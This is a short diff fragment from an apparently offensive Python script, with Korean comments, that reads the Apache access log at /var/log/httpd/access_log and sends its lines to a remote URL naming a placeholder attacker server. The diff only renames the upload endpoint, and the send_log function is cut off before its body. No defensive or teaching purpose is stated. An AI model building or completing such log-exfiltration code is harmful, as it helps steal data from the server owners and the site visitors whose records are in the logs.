@@ -6,7 +6,7 @@ import subprocess
 # 로그 파일 경로
 LOG_FILE_PATH = '/var/log/httpd/access_log'
 # 로그를 전송할 원격 서버 URL
-REMOTE_SERVER_URL = 'http://[attacker_server]/upload_log.php'
+REMOTE_SERVER_URL = 'http://[attacker_server]/upload.php'
 
 def send_log(log_line):
     try:
